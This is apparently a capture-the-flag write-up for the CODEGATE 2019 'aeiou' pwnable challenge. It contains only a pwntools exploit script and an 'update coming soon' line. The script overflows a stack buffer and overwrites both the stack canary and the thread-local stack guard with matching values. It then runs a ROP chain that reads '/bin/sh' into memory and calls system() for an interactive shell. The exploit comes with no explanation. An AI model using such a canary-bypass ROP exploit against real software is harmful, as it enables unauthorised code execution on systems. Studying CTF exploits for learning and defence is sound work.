---
title: CODEGATE 2019 - aeiou
categories:
 - pwnable
tags:
---

## slv.py

```python
from pwn import *


p = process('./aeiou')
e = ELF('./aeiou')

context.terminal = ['/goorm/tmux', 'splitw', '-h']
context.log_level = 'debug'

script='''
b* 0x4013aa
b* 0x40145f
b* _IO_vfscanf_internal+47\n
dir /usr/src/glibc/eglibc-2.19/stdio-common
'''

sla = lambda c, s: p.sendlineafter(c, str(s))
sa = lambda c, s: p.sendafter(c, str(s))
sl = lambda s: p.sendline(str(s))
s = lambda s: p.send(str(s))


#puts_addr = e.plt['puts']
#puts_got = e.got['puts']
read_addr = e.plt['read']
system_addr = e.plt['system']
scanf_addr = e.plt['__isoc99_scanf']
binsh_offset = 0x258cdd

ppr = 0x004026f1 # pop rsi; pop r15; ret
pr = 0x004026f3 # pop rdi; ret
arg = 0x40277b # "%s" address
bss = 0x604200


def Teach_num(size, payload):
	
	sla('>>', 3)
	sa('number!\n', size)

	sleep(0.1)
	
	s(payload)
	
	return

def main():
	
	ROP = ''
	ROP += p64(pr)
	ROP += p64(0x0)
	
	ROP += p64(ppr)
	ROP += p64(bss)
	ROP += p64(0xdeadbeef)
	
	ROP += p64(read_addr)
	
	ROP += p64(pr)
	ROP += p64(bss)
	
	ROP += p64(system_addr)
	
	payload = ''
	payload += 'a'*0x100b
	payload += 'c'*0x8 # stack_canary
	payload += 'd'*0x8 # FSP
	payload += ROP # RET
	payload += 'a'*0x6f0
	
	payload += 'e'*8 # fs:[0xffffffffffffff50]

	
	payload += 'f'*(0xf0 - len(ROP))
	#payload += 'a'*(0x7e8 - len(ROP))
	payload += 'b'* (0x8 * 5)
	payload += 'c'*0x8 # stack_guard
	#payload += cyclic(0x800)
	
	
	#gdb.attach(p,script)
	
	Teach_num(len(payload)-0x3, payload)
	
	p.sendline('/bin/sh')
	
	p.interactive()
	


if __name__ == '__main__':
	main()
```
update comming soon...